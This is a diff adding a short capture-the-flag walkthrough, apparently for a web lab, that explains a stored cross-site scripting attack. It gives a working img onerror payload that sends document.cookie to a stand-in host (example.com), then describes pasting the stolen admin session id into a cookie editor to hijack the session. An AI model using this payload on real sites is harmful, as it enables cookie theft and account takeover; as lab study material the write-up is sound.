@@ -1,0 +1,3 @@
+This is (almost) the same as earlier, but harder, and requires knowledge of jquery. Add a page, then add a comment, edit the `input[name=comment]` to say `><img src=M onerror=location.href='http://example.com?cookie='+document.cookie;>`, and click report Abuse. This will dump the cookie to the client.
+
+Next, just use a cookie editor to insert the session id into your own session. Now you've hijacked the session of the admin! The flag is simply named Flag.
